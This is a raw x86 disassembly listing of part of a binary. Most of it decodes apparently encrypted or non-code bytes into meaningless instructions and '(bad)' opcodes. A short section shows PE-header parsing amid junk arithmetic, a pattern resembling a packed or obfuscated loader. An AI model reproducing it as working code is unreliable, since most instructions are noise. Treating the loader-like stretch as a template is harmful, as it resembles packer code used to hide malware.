  409b72:	xor    ah,ah
  409b74:	pop    ss
  409b75:	xchg   edx,eax
  409b76:	nop
  409b77:	pop    ds
  409b78:	jno    0x409be9
  409b7a:	jl     0x409b50
  409b7c:	test   BYTE PTR [ecx+0x11275a59],dl
  409b82:	add    bl,bh
  409b84:	out    dx,al
  409b85:	cmp    DWORD PTR gs:[ebp+0x18],ebx
  409b89:	sbb    ah,BYTE PTR [edi]
  409b8b:	loop   0x409c08
  409b8d:	aad    0xa4
  409b8f:	lods   al,BYTE PTR ds:[esi]
  409b90:	and    DWORD PTR [ecx-0x16],eax
  409b93:	mov    WORD PTR [esi+0x1182072e],ds
  409b99:	pop    ebp
  409b9a:	xchg   edx,eax
  409b9b:	pop    ebx
  409b9c:	jno    0x409b6e
  409b9e:	leave  
  409b9f:	dec    esp
  409ba0:	stos   DWORD PTR es:[edi],eax
  409ba1:	mov    edx,0x1b2c4e1d
  409ba6:	ficom  WORD PTR [esi+eiz*4]
  409ba9:	xchg   edi,eax
  409baa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409bab:	ret    
  409bac:	ds cli 
  409bae:	sbb    ebx,ebp
  409bb0:	mov    ah,0x5e
  409bb2:	mov    ebp,DWORD PTR [ebx]
  409bb4:	cmc    
  409bb5:	mov    ds:0x155d054d,al
  409bba:	addr16 out 0x4c,eax
  409bbd:	clc    
  409bbe:	bound  ecx,QWORD PTR ds:0x80bd8876
  409bc4:	mov    eax,ds:0x4943ebb0
  409bc9:	adc    eax,0xeaddff30
  409bce:	fistp  WORD PTR [ecx-0x1b]
  409bd1:	popa   
  409bd2:	add    bl,BYTE PTR [edx+0x4babd0eb]
  409bd8:	cdq    
  409bd9:	stos   BYTE PTR es:[edi],al
  409bda:	mov    ebp,0x7636e0ec
  409bdf:	les    esi,FWORD PTR [edx+0x4]
  409be2:	jg     0x409c5d
  409be4:	xor    cl,BYTE PTR [ecx]
  409be6:	lds    eax,FWORD PTR [ebx+0x65]
  409be9:	mov    ecx,0x19839d0b
  409bee:	(bad)  
  409bef:	xchg   edx,eax
  409bf0:	push   esp
  409bf1:	popf   
  409bf2:	cwde   
  409bf3:	xchg   esi,eax
  409bf4:	inc    edx
  409bf5:	jb     0x409bc4
  409bf7:	nop
  409bf8:	push   0xffffffc6
  409bfa:	mov    DWORD PTR [edi-0x2436c432],esp
  409c00:	pop    ecx
  409c01:	cmp    DWORD PTR [ecx+0x7f],ecx
  409c04:	es cli 
  409c06:	jecxz  0x409b97
  409c08:	xor    eax,0xdededcb0
  409c0d:	sbb    edx,DWORD PTR [eax-0x50]
  409c10:	push   eax
  409c11:	icebp  
  409c12:	jecxz  0x409bae
  409c14:	jmp    FWORD PTR [eax-0x54]
  409c17:	jl     0x409c3c
  409c19:	mov    esp,0xf52609de
  409c1e:	dec    ecx
  409c1f:	stos   BYTE PTR es:[edi],al
  409c20:	scas   al,BYTE PTR es:[edi]
  409c21:	aam    0x9a
  409c23:	fdivr  DWORD PTR [ebx-0x11956942]
  409c29:	leave  
  409c2a:	int    0x5a
  409c2c:	jge    0x409c4e
  409c2e:	cmp    eax,0x4fed2491
  409c33:	push   edx
  409c34:	fsubr  QWORD PTR [ecx]
  409c36:	and    BYTE PTR [esi+0x5e],0x33
  409c3a:	or     al,0x7
  409c3c:	push   ebp
  409c3d:	mov    dl,0x36
  409c3f:	pushf  
  409c40:	ins    DWORD PTR es:[edi],dx
  409c41:	cld    
  409c42:	or     DWORD PTR [edx],0xffffffd8
  409c45:	jl     0x409c3e
  409c47:	leave  
  409c48:	mov    eax,ds:0x4a521ea4
  409c4d:	enter  0xa53,0xf9
  409c51:	xchg   esi,eax
  409c52:	fst    QWORD PTR [ecx-0x42d27ff]
  409c58:	push   eax
  409c59:	je     0x409c8e
  409c5b:	push   ebx
  409c5c:	push   edi
  409c5d:	rol    BYTE PTR [ecx],0x88
  409c60:	shr    BYTE PTR [eax],1
  409c62:	or     eax,0xc500398a
  409c67:	push   0xffffffb8
  409c69:	repnz sub eax,0x82ed8610
  409c6f:	(bad)  
  409c71:	pop    ecx
  409c72:	sub    cl,al
  409c74:	dec    esp
  409c75:	push   ebx
  409c76:	xchg   BYTE PTR [eax],al
  409c78:	int3   
  409c79:	dec    esi
  409c7a:	test   edx,ebx
  409c7c:	and    DWORD PTR [edx],esi
  409c7e:	les    ecx,FWORD PTR [ebx-0x1b]
  409c81:	mov    esi,0x22db10e2
  409c86:	lahf   
  409c87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c88:	mov    esp,0x6d3b7319
  409c8d:	xchg   edi,eax
  409c8e:	jbe    0x409c47
  409c90:	and    eax,0xf5c96fb9
  409c95:	ret    
  409c96:	pop    ebx
  409c97:	cld    
  409c98:	pushf  
  409c99:	mov    ch,0xc2
  409c9b:	adc    BYTE PTR [ecx+0x44],dh
  409c9e:	mov    edi,0x1b1582f9
  409ca3:	mov    cl,0x8a
  409ca5:	add    BYTE PTR [ecx+0x42485415],al
  409cab:	add    al,ah
  409cad:	mov    dh,0x44
  409caf:	add    BYTE PTR [esi*1+0x66e94934],al
  409cb6:	add    DWORD PTR [eax],eax
  409cb8:	add    BYTE PTR [ecx],al
  409cba:	bound  esp,QWORD PTR [eax-0x13]
  409cbd:	arpl   bp,bp
  409cbf:	cdq    
  409cc0:	jp     0x409c53
  409cc2:	fldenv [esi+ebx*2-0x60aed7fd]
  409cc9:	mov    cl,0xc0
  409ccb:	jl     0x409d49
  409ccd:	retf   0x7c7f
  409cd0:	jl     0x409d46
  409cd2:	sub    ch,BYTE PTR [ebx]
  409cd4:	in     eax,0xca
  409cd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409cd7:	mov    esp,0xb205ca0b
  409cdc:	fstp   TBYTE PTR [ecx-0x24]
  409cdf:	popa   
  409ce0:	ss jg  0x409d34
  409ce3:	test   DWORD PTR [ecx-0x2adc12b3],ebp
  409ce9:	test   eax,0x2f147621
  409cee:	icebp  
  409cef:	inc    esi
  409cf0:	jae    0x409ca3
  409cf2:	sar    BYTE PTR [esi-0x57fe6465],0xa8
  409cf9:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409cfb:	(bad)  
  409cfc:	adc    al,0x3a
  409cfe:	dec    ecx
  409cff:	add    DWORD PTR [edi-0x4c],esi
  409d02:	imul   eax,eax,0x793d47cd
  409d08:	sahf   
  409d09:	shl    ah,cl
  409d0b:	cmc    
  409d0c:	mov    bl,0x3b
  409d0e:	mov    edi,0x548547dc
  409d13:	das    
  409d14:	(bad)  
  409d15:	or     eax,0x7b39d30f
  409d1a:	inc    esi
  409d1b:	pop    ecx
  409d1c:	add    DWORD PTR [ecx],ecx
  409d1e:	jno    0x409d94
  409d20:	and    BYTE PTR [ebx+eiz*8],ah
  409d23:	jnp    0x409d28
  409d25:	mov    edi,0xd985dc5e
  409d2a:	imul   eax,ebx,0x7c
  409d2d:	xchg   esp,eax
  409d2e:	jne    0x409d3b
  409d30:	rcr    dl,cl
  409d32:	shl    DWORD PTR [ebx-0x3a],0x13
  409d36:	stc    
  409d37:	int    0xb8
  409d39:	jl     0x409d09
  409d3b:	dec    edi
  409d3c:	les    ebx,FWORD PTR [ebp+0x41]
  409d3f:	lods   eax,DWORD PTR ds:[esi]
  409d40:	xor    al,0x14
  409d42:	xchg   DWORD PTR [edi],eax
  409d44:	fst    QWORD PTR [edi+ebx*8]
  409d47:	aas    
  409d48:	mov    ah,0x9b
  409d4a:	pushf  
  409d4b:	mov    bl,0x32
  409d4d:	xchg   ecx,eax
  409d4e:	ins    DWORD PTR es:[edi],dx
  409d4f:	stos   DWORD PTR es:[edi],eax
  409d50:	adc    BYTE PTR [esi+edx*8],bh
  409d53:	scas   al,BYTE PTR es:[edi]
  409d54:	daa    
  409d55:	cs push si
  409d58:	sbb    DWORD PTR ds:[ebx+0x5a],eax
  409d5c:	pop    edi
  409d5d:	xor    BYTE PTR [ecx-0x5658f9d6],al
  409d63:	mov    BYTE PTR [edi-0x42],bl
  409d66:	cmp    eax,0xe1d06e98
  409d6b:	aam    0xbc
  409d6d:	loope  0x409d6b
  409d6f:	mov    ds:0x433d5a69,al
  409d74:	mov    BYTE PTR [edx+ebp*4-0x61],bl
  409d78:	icebp  
  409d79:	lods   al,BYTE PTR ds:[esi]
  409d7a:	cmp    eax,0xdf172b25
  409d7f:	mov    esi,0x6291f33
  409d84:	aaa    
  409d85:	xor    eax,0xfe4f5388
  409d8a:	rcr    BYTE PTR [edx],1
  409d8c:	gs dec eax
  409d8e:	stos   BYTE PTR es:[edi],al
  409d8f:	inc    ebp
  409d90:	jae    0x409da8
  409d92:	add    al,0xd0
  409d94:	retf   0x7ea1
  409d97:	ret    0x2cb1
  409d9a:	fmul   QWORD PTR [esi+ebx*1+0x3a]
  409d9e:	cmp    esp,DWORD PTR [esi+0x15]
  409da1:	pop    ebp
  409da2:	push   esi
  409da3:	sbb    DWORD PTR [ecx],edi
  409da5:	stc    
  409da6:	pop    edi
  409da7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409da8:	jmp    0xdb61339
  409dad:	dec    dh
  409daf:	cli    
  409db0:	push   0x6bb35bfc
  409db5:	pusha  
  409db6:	sub    al,0xa0
  409db8:	inc    esi
  409db9:	dec    ecx
  409dba:	or     DWORD PTR [esi+edx*1+0x36],esi
  409dbe:	jmp    0x409e02
  409dc0:	mov    ecx,edx
  409dc2:	test   al,0x69
  409dc4:	mov    dh,0xd8
  409dc6:	bound  ecx,QWORD PTR [edx+ecx*1-0x10]
  409dca:	push   edi
  409dcb:	inc    esi
  409dcc:	sub    BYTE PTR [eax-0x5a],al
  409dcf:	lahf   
  409dd0:	lock xchg DWORD PTR [edx+0x6e],esi
  409dd4:	repnz aaa 
  409dd6:	sbb    al,0xa8
  409dd8:	imul   esi,DWORD PTR ds:0xd0e0122f,0xfffffff5
  409ddf:	or     BYTE PTR [eax-0x75],ch
  409de2:	pop    edi
  409de3:	lds    ebx,FWORD PTR [ecx+eiz*2]
  409de6:	das    
  409de7:	frndint 
  409de9:	bound  esi,QWORD PTR [ebx-0x68e30efe]
  409def:	ja     0x409e6b
  409df1:	scas   eax,DWORD PTR es:[edi]
  409df2:	pushf  
  409df3:	jmp    0x49bfbf79
  409df8:	mov    bh,0x46
  409dfa:	neg    BYTE PTR [esi+esi*1]
  409dfd:	imul   eax,esp,0xffffffa9
  409e00:	add    DWORD PTR [ecx],eax
  409e02:	add    edx,esi
  409e04:	sbb    al,0xb0
  409e06:	ror    BYTE PTR [edi-0x7c9fd34d],1
  409e0c:	xchg   esp,eax
  409e0d:	sbb    DWORD PTR [ebp-0x50],esi
  409e10:	jmp    0x1847:0xdaecea99
  409e17:	out    dx,al
  409e18:	jne    0x409db0
  409e1a:	sbb    al,0x86
  409e1c:	scas   eax,DWORD PTR es:[edi]
  409e1d:	outs   dx,BYTE PTR ds:[esi]
  409e1e:	push   esp
  409e1f:	cmp    al,0xcb
  409e21:	mov    DWORD PTR ds:0x42483c,0x71b7
  409e2b:	jne    0x40a324
  409e31:	or     DWORD PTR ds:0x410757,edx
  409e37:	mov    eax,DWORD PTR [ebp+0x8]
  409e3a:	mov    ecx,DWORD PTR [ebp+0x8]
  409e3d:	adc    DWORD PTR ds:0x448988,0x48d6
  409e47:	add    ecx,DWORD PTR [eax+0x3c]
  409e4a:	mov    edx,DWORD PTR ds:0x4454dc
  409e50:	xor    eax,eax
  409e52:	or     eax,DWORD PTR ds:0x4454e8
  409e58:	sub    eax,edx
  409e5a:	and    edx,DWORD PTR [edx+eax*1]
  409e5d:	mov    edx,0x7510857
  409e62:	mov    DWORD PTR ds:0x410743,0x1d
  409e6c:	cmp    DWORD PTR ds:0x410743,0x0
  409e73:	je     0x409eb2
  409e79:	cmp    DWORD PTR ds:0x410743,0x2c
  409e80:	jne    0x409ea2
  409e86:	push   DWORD PTR [ebp-0x1c]
  409e89:	push   DWORD PTR [ebp-0x28]
  409e8c:	push   DWORD PTR [ebp-0x10]
  409e8f:	push   0x1f6d
  409e94:	push   0x61b1
  409e99:	push   DWORD PTR [ebp-0x14]
  409e9c:	call   DWORD PTR ds:0x443044
  409ea2:	mov    eax,ds:0x410743
  409ea7:	dec    eax
  409ea8:	mov    ds:0x410743,eax
  409ead:	jmp    0x409e6c
  409eb2:	mov    DWORD PTR [ebp+0x8],ecx
  409eb5:	mov    eax,DWORD PTR [ebp-0x4]
  409eb8:	xor    eax,edx
  409eba:	push   esi
  409ebb:	mov    esi,DWORD PTR [ebp+0x8]
  409ebe:	mov    ecx,0x32729e
  409ec3:	add    eax,ecx
  409ec5:	cmp    DWORD PTR [esi+0x54],eax
  409ec8:	jmp    0x40a033
  409ecd:	mov    esi,0x45a9bf40
  409ed2:	mov    ebp,0xfb297b56
  409ed7:	test   BYTE PTR [esi-0x8320487],bl
  409edd:	cmpps  xmm7,XMMWORD PTR [esp+edi*2-0x36],0x7f
  409ee3:	jl     0x409f61
  409ee5:	xor    BYTE PTR [esi+edx*2+0x6e8cb176],ah
  409eec:	leave  
  409eed:	fwait
  409eee:	inc    esi
  409eef:	jl     0x409f0f
  409ef1:	in     al,dx
  409ef2:	inc    ecx
  409ef3:	jbe    0x409ea8
  409ef5:	inc    edi
  409ef6:	call   0x2bbc7fe8
  409efb:	pop    ebp
  409efc:	lahf   
  409efd:	bnd jns 0x409f03
  409f00:	fstp   DWORD PTR [eax+0x4]
  409f03:	stc    
  409f04:	cmp    DWORD PTR [ecx+0x52],edi
  409f07:	dec    ecx
  409f08:	dec    esi
  409f09:	pop    es
  409f0a:	int    0x50
  409f0c:	pop    ebp
  409f0d:	mov    ecx,0x2c1aa3d5
  409f12:	xchg   BYTE PTR ss:[ebp-0x22fc8d92],bl
  409f19:	bound  eax,QWORD PTR [esi-0x7366946b]
  409f1f:	imul   eax,DWORD PTR [ebx+ecx*1-0x38],0x4b3ba663
  409f27:	jge    0x409f77
  409f29:	out    0x5e,al
  409f2b:	inc    edi
  409f2c:	jnp    0x409f82
  409f2e:	mov    ebx,0x80015ca1
  409f33:	cmp    al,cl
  409f35:	and    eax,0x99f37957
  409f3a:	in     eax,0x4e
  409f3c:	(bad)  
  409f3d:	xor    esi,edx
  409f3f:	scas   eax,DWORD PTR es:[edi]
  409f40:	into   
  409f41:	fcomp  st(7)
  409f43:	or     eax,0x9a51e5ee
  409f48:	and    al,0x64
  409f4a:	xchg   edx,eax
  409f4b:	dec    ebp
  409f4d:	pop    esi
  409f4e:	fsubr  DWORD PTR [ebp+0x70]
  409f51:	mov    DWORD PTR [ecx],esp
  409f53:	scas   eax,DWORD PTR es:[edi]
  409f54:	push   cs
  409f55:	pushf  
  409f56:	lods   eax,DWORD PTR ds:[esi]
  409f57:	out    dx,al
  409f58:	or     eax,0xcbc6e7c0
  409f5d:	mov    edi,0xfbf73b4e
  409f62:	push   0x7
  409f64:	and    ebp,esi
  409f66:	cmp    DWORD PTR [ebp+0x4b],ebx
  409f69:	hlt    
  409f6a:	in     eax,0x15
  409f6c:	cs sahf 
  409f6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f6f:	sar    BYTE PTR [ecx-0x2cfa4029],0xd9
  409f76:	push   eax
  409f77:	cmp    DWORD PTR [esi],edi
  409f79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f7a:	adc    DWORD PTR [esp+eiz*2],esi
  409f7d:	ds and al,0xde
  409f80:	out    dx,eax
  409f81:	sahf   
  409f82:	(bad)  
  409f83:	jmp    0x78d2f760
  409f88:	std    
  409f89:	and    ch,BYTE PTR [eax-0x1e1f627a]
  409f8f:	fbstp  TBYTE PTR [edx+0x43]
  409f92:	test   BYTE PTR [edx+0x23c2b7e2],dh
  409f98:	scas   eax,DWORD PTR es:[edi]
  409f99:	push   ebp
  409f9a:	jl     0x409f6d
  409f9c:	or     bh,BYTE PTR [ebx+0x3965fce7]
  409fa2:	xchg   edx,eax
  409fa3:	pop    edx
  409fa4:	pop    ss
  409fa5:	xor    edi,DWORD PTR [ecx+ebx*4-0x32]
  409fa9:	js     0x409f73
  409fab:	lock jno 0x409f4a
  409fae:	dec    ax
  409fb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409fb1:	push   ecx
  409fb2:	fdiv   QWORD PTR [ebp+0x29]
  409fb5:	inc    eax
  409fb6:	sbb    BYTE PTR [esi+0x3b6ddb92],0x11
  409fbd:	mov    ah,BYTE PTR [ebx+0x58]
  409fc0:	jp     0x409fcc
  409fc2:	or     al,0x9f
  409fc4:	cmp    ebx,0xffffffbd
  409fc7:	inc    ecx
  409fc8:	jb     0x409fc3
  409fca:	mov    edi,DWORD PTR [ecx-0x66]
  409fcd:	cwde   
  409fce:	cmp    eax,0xe429e83d
  409fd3:	sub    eax,0xced5e952
  409fd8:	mov    WORD PTR [ebx-0x4677ecc8],?
  409fde:	push   edi
  409fdf:	mov    ch,0x4d
  409fe1:	xchg   esp,eax
  409fe2:	cmp    ebp,ebp
  409fe4:	cld    
  409fe5:	mov    eax,DWORD PTR [edi+0x42]
  409fe8:	and    DWORD PTR [ebp-0x5927c93a],esp
  409fee:	shl    DWORD PTR [eax+0x49f6bcf5],0xdc
  409ff5:	xchg   esi,eax
  409ff6:	sub    BYTE PTR [eax-0x5d],ah
  409ff9:	frstor cs:[esi]
  409ffc:	sub    BYTE PTR [edx+edi*2-0xe835744],ah
  40a003:	cmp    ecx,edi
  40a005:	sub    BYTE PTR [ebx],dh
  40a007:	ds jae 0x40a07e
  40a00a:	imul   esp,DWORD PTR [ebx-0x27],0x67
  40a00e:	push   edx
  40a00f:	pop    ss
  40a010:	les    esp,FWORD PTR [edi-0x48ed3184]
  40a016:	fisttp DWORD PTR [esi+0x5c4e41b7]
  40a01c:	out    dx,al
  40a01d:	repz pushf 
  40a01f:	daa    
  40a020:	and    eax,0xbec0c2ec
  40a025:	push   es
  40a026:	loop   0x409ff5
  40a028:	and    bh,dl
  40a02a:	push   cs
  40a02b:	pop    ss
  40a02c:	xor    DWORD PTR ds:0x17ce4546,edi
  40a032:	fistp  DWORD PTR [esi+0xf]
  40a035:	test   BYTE PTR [ebx+0x1],dh
  40a038:	add    BYTE PTR [eax],al
  40a03a:	mov    eax,DWORD PTR [ebp+0x8]
  40a03d:	jmp    0x40a331
  40a042:	jmp    0x40a1ad
  40a047:	xchg   ecx,eax
  40a048:	test   dh,dl
  40a04a:	loopne 0x40a045
  40a04c:	bound  edi,QWORD PTR [ebp+0x7db7845d]
  40a052:	add    DWORD PTR [edi],ebp
  40a054:	fld    DWORD PTR [ecx]
  40a056:	loope  0x40a035
  40a058:	lds    edi,FWORD PTR [esp+edi*2-0x36]
  40a05c:	jg     0x40a0da
  40a05e:	jl     0x40a0b3
  40a060:	shr    BYTE PTR [edi+0x4c2595df],0x33
  40a067:	dec    edi
  40a068:	cmc    
  40a069:	scas   al,BYTE PTR es:[edi]
  40a06a:	std    
  40a06b:	nop
  40a06c:	push   eax
  40a06d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a06e:	sub    DWORD PTR [eax+0x60],0x24262d95
  40a075:	in     eax,dx
  40a076:	jb     0x40a0a9
  40a078:	add    al,0xf0
  40a07a:	aaa    
  40a07b:	fwait
  40a07c:	pop    ebp
  40a07d:	jmp    0x81be:0x9fac4bec
  40a084:	icebp  
  40a085:	dec    ebx
  40a086:	add    esi,DWORD PTR [eax-0x4d]
  40a089:	mov    ds:0x98c65e70,al
  40a08e:	mov    ah,0xfe
  40a090:	jo     0x40a054
  40a092:	adc    BYTE PTR [ebp+0x19bab22b],bh
  40a098:	sbb    DWORD PTR [ebp+0x20],edx
  40a09b:	mov    esi,DWORD PTR [ecx-0x251abccd]
  40a0a1:	inc    edx
  40a0a2:	mov    bh,0xb5
  40a0a4:	ds ins DWORD PTR es:[edi],dx
  40a0a6:	fisubr WORD PTR [esi]
  40a0a8:	hlt    
  40a0a9:	out    dx,eax
  40a0aa:	add    BYTE PTR [ebx],al
  40a0ac:	push   0xffffffd3
  40a0ae:	fcmovbe st,st(0)
  40a0b0:	sti    
  40a0b1:	xchg   esp,eax
  40a0b2:	and    DWORD PTR [esi-0x50],eax
  40a0b5:	pop    edx
  40a0b6:	(bad)  
  40a0b7:	xor    eax,0x767173be
  40a0bc:	pop    edi
  40a0bd:	data16 aaa 
  40a0bf:	pop    edi
  40a0c0:	xlat   BYTE PTR ds:[ebx]
  40a0c1:	inc    edi
  40a0c2:	test   al,0x85
  40a0c4:	mov    ebx,0x6bf2b3df
  40a0c9:	cmp    edx,eax
  40a0cb:	cli    
  40a0cc:	jo     0x40a064
  40a0ce:	addr16 rol esp,0x82
  40a0d2:	sub    ch,BYTE PTR [ecx-0x47]
  40a0d5:	mov    ebx,0xe987a9ea
  40a0da:	in     eax,0xc1
  40a0dc:	scas   al,BYTE PTR es:[edi]
  40a0dd:	inc    edi
  40a0de:	pop    edi
  40a0df:	sbb    bl,BYTE PTR [ebp-0x3f29e5fd]
  40a0e5:	mov    ebx,0xf16db79c
  40a0ea:	xchg   ecx,eax
  40a0eb:	repnz ror DWORD PTR [esi-0x6b],cl
  40a0ef:	int    0x53
  40a0f1:	ds mov al,0x3a
  40a0f4:	pop    edx
  40a0f5:	test   al,0x81
  40a0f7:	out    0xe7,eax
  40a0f9:	pop    es
  40a0fa:	xchg   ebp,eax
  40a0fb:	sbb    BYTE PTR [esi-0x3],ah
  40a0fe:	add    BYTE PTR [ebx-0xf5d2878],ah
  40a104:	pop    es
  40a105:	in     eax,0x79
  40a107:	add    al,0x33
  40a109:	dec    edi
  40a10a:	loopne 0x40a136
  40a10c:	xor    ch,BYTE PTR [ebp-0x35a33d24]
  40a112:	leave  
  40a113:	ds ss inc ebx
  40a116:	push   esp
  40a117:	push   ds
  40a118:	jo     0x40a0a7
  40a11a:	loope  0x40a0f6
  40a11c:	inc    DWORD PTR [esi-0x11]
  40a11f:	mov    eax,ds:0x153ae646
  40a124:	test   eax,0xe8ef93e4
  40a129:	dec    ebx
  40a12a:	popf   
  40a12b:	adc    edx,DWORD PTR [edx-0x3e]
  40a12e:	mov    gs,WORD PTR [edi]
  40a130:	popa   
  40a131:	ds push edi
  40a133:	or     esp,DWORD PTR [edx+0x7b87cc83]
  40a139:	jb     0x40a11a
  40a13b:	int3   
  40a13c:	jecxz  0x40a1ba
  40a13e:	and    al,0x96
  40a140:	mov    al,0xeb
  40a142:	std    
  40a143:	aam    0x97
  40a145:	jae    0x40a0fe
  40a147:	pop    edi
  40a148:	scas   al,BYTE PTR es:[edi]
  40a149:	inc    ecx
  40a14a:	or     BYTE PTR [edx],ah
  40a14c:	jmp    0x176ca3e4
  40a151:	ds pushf 
  40a153:	mov    ebx,0x4b3c4687
  40a158:	mov    cl,0x8f
  40a15a:	xchg   edx,ecx
  40a15c:	xchg   DWORD PTR [ecx+0x6016e45e],ebx
  40a162:	mov    ecx,0x8c4c5a73
  40a167:	mov    ebx,0x93de628a
  40a16c:	into   
  40a16d:	mov    esi,?
  40a16f:	push   eax
  40a170:	xchg   bh,bl
  40a172:	pusha  
  40a173:	mov    eax,0x1f82117e
  40a178:	(bad)  
  40a179:	popf   
  40a17a:	inc    esi
  40a17b:	add    DWORD PTR [ebp+eiz*2-0x5f51418f],eax
  40a182:	sbb    bl,BYTE PTR ds:0xe8f4bfaa
  40a188:	fistp  WORD PTR [esi+ebx*1+0x44]
  40a18c:	in     eax,dx
  40a18d:	mov    BYTE PTR [esp+esi*4],bl
  40a190:	xchg   ecx,eax
  40a191:	mov    ds:0xd64eecb6,al
  40a196:	ret    
  40a197:	or     eax,0x25f0e217
  40a19c:	pop    ebx
  40a19d:	int3   
  40a19e:	fdiv   QWORD PTR [ebp-0x35]
  40a1a1:	add    eax,0xcad9ed8b
  40a1a6:	mov    esp,0xbcb1fcf
  40a1ab:	aad    0x6a
  40a1ad:	mov    eax,DWORD PTR [ebp-0x4]
  40a1b0:	jmp    0x40a31b
  40a1b5:	aam    0x68
  40a1b7:	rol    BYTE PTR [eax+0x50],1
  40a1ba:	pop    eax
  40a1bb:	fs js  0x40a15e
  40a1be:	jge    0x40a14e
  40a1c0:	ficomp WORD PTR [ebp-0x33]
  40a1c3:	inc    ebp
  40a1c4:	fwait
  40a1c5:	stos   DWORD PTR es:[edi],eax
  40a1c6:	les    edi,FWORD PTR [esp+edi*2-0x36]
  40a1ca:	jg     0x40a248
  40a1cc:	jl     0x40a215
  40a1ce:	(bad)  
  40a1cf:	loop   0x40a210
  40a1d1:	mov    cl,0x97
  40a1d3:	out    dx,eax
  40a1d4:	sar    DWORD PTR [edi],1
  40a1d6:	dec    ebp
  40a1d7:	int    0xa6
  40a1d9:	retf   0x7416
  40a1dc:	jns    0x40a16f
  40a1de:	icebp  
  40a1df:	stos   BYTE PTR es:[edi],al
  40a1e0:	sub    eax,0x37f42267
  40a1e5:	xor    edx,DWORD PTR [ebx]
  40a1e7:	and    al,0xa2
  40a1e9:	cli    
  40a1ea:	adc    DWORD PTR [edi+0x6a67ccce],esi
  40a1f0:	fidiv  DWORD PTR [ebp-0x7844b4e0]
  40a1f6:	rcl    edi,0x1d
  40a1f9:	nop
  40a1fa:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  40a1fc:	mov    bl,0xc1
  40a1fe:	outs   dx,BYTE PTR ds:[esi]
  40a1ff:	std    
  40a200:	jo     0x40a1b4
  40a202:	popf   
  40a203:	jae    0x40a199
  40a205:	in     eax,dx
  40a206:	ret    0x85b6
  40a209:	sar    BYTE PTR [ebx],cl
  40a20b:	(bad)  
  40a20c:	push   ebx
  40a20d:	das    
  40a20e:	push   ecx
  40a20f:	xchg   ebp,eax
  40a210:	jge    0x40a260
  40a212:	fwait
  40a213:	push   ss
  40a214:	cs mov dh,0xce
  40a217:	jbe    0x40a231
  40a219:	test   eax,0xce08820
  40a21e:	arpl   WORD PTR [ebx+0x6d],bx
  40a221:	es sub eax,0xfa7afd47
  40a227:	jge    0x40a1b1
  40a229:	sahf   
  40a22a:	mov    ebp,0xbc4abdf9
  40a22f:	repz (bad) 
  40a231:	fadd   QWORD PTR [eax-0x18135f80]
  40a237:	jbe    0x40a260
  40a239:	push   edi
  40a23a:	or     DWORD PTR [ebp-0x1b],esp
  40a23d:	xchg   DWORD PTR [ebp+0x17],esi
  40a240:	add    bh,BYTE PTR [ebx]
  40a242:	jno    0x40a214
  40a244:	mov    ebx,0xf94cc47b
  40a249:	push   0x1d
  40a24b:	push   ecx
  40a24c:	out    0x94,al
  40a24e:	or     BYTE PTR [ebx],ah
  40a250:	push   ebx
  40a251:	popa   
  40a252:	jbe    0x40a2b7
  40a254:	clc    
  40a255:	or     al,0xd4
  40a257:	sbb    ch,BYTE PTR [edi-0x15]
  40a25a:	inc    ebp
  40a25b:	push   edx
  40a25c:	nop
  40a25d:	loope  0x40a24f
  40a25f:	xchg   BYTE PTR [esi+ecx*2],cl
  40a262:	repz adc cl,al
  40a265:	in     al,dx
  40a266:	arpl   ax,cx
  40a268:	dec    ebp
  40a269:	cmp    bl,al
  40a26b:	jge    0x40a21c
  40a26d:	jo     0x40a21f
  40a26f:	sub    dl,BYTE PTR [ebx]
  40a271:	add    ebx,ebx
  40a273:	mov    cl,0x12
  40a275:	adc    eax,0x9dbe0706
  40a27a:	retf   0xb3fd
  40a27d:	stos   DWORD PTR es:[di],eax
  40a27f:	sti    
  40a280:	adc    bh,BYTE PTR [ecx-0x74]
  40a283:	inc    ebx
  40a284:	or     al,0x10
  40a286:	mov    al,0xd5
  40a288:	cmp    ecx,DWORD PTR [edi+ecx*2-0x28]
  40a28c:	lahf   
  40a28d:	fcom   QWORD PTR [eax-0x2d]
  40a290:	fwait
  40a291:	mov    WORD PTR [ebx*1+0xa93ee8],cs
  40a298:	rol    bh,0x26
  40a29b:	mov    esi,0x145f88dc
  40a2a0:	jne    0x40a261
  40a2a2:	mov    ch,0x19
  40a2a4:	loop   0x40a255
  40a2a6:	jo     0x40a292
  40a2a8:	in     al,0xc0
  40a2aa:	push   cs
  40a2ab:	imul   edi,DWORD PTR [eax+ebx*2-0x75],0xe6b57674
  40a2b3:	jmp    0xff2c:0x412b141d
  40a2ba:	or     ch,0x8d
  40a2bd:	pop    edx
  40a2be:	mov    al,0x6b
  40a2c0:	xor    ebp,eax
  40a2c2:	inc    edx
  40a2c3:	cmp    edi,DWORD PTR [edx-0x58265bdf]
  40a2c9:	or     cl,BYTE PTR [ecx+0x2a]
  40a2cc:	xor    bx,WORD PTR [ebp-0x37]
  40a2d0:	aad    0xa1
  40a2d2:	and    esi,edi
  40a2d4:	leave  
  40a2d5:	ja     0x40a316
  40a2d7:	xor    eax,0xa613c0e8
  40a2dc:	xchg   ebp,eax
  40a2dd:	sbb    ch,BYTE PTR [edi]
  40a2df:	xor    BYTE PTR [esi+esi*1+0x3f],bh
  40a2e3:	xor    dl,BYTE PTR [edx]
  40a2e5:	into   
  40a2e6:	mov    ecx,0xaf8392b2
  40a2eb:	push   ebp
  40a2ec:	inc    edx
  40a2ed:	loopne 0x40a29d
  40a2ef:	cmp    DWORD PTR [edi+0x36e3fdd],edx
  40a2f5:	je     0x40a339
  40a2f7:	jne    0x40a357
  40a2f9:	fstp   TBYTE PTR [ecx-0x267e870b]
  40a2ff:	sbb    al,0x57
  40a301:	cmc    
  40a302:	or     DWORD PTR [esi],ebx
  40a304:	(bad)  
  40a305:	mov    dl,0x3
  40a307:	(bad)  
  40a308:	out    dx,al
  40a309:	mov    edx,0xbc21f1f9
  40a30e:	stos   BYTE PTR es:[edi],al
  40a30f:	stc    
  40a310:	mov    esi,0x4f49bf47
  40a315:	enter  0xcf42,0x32
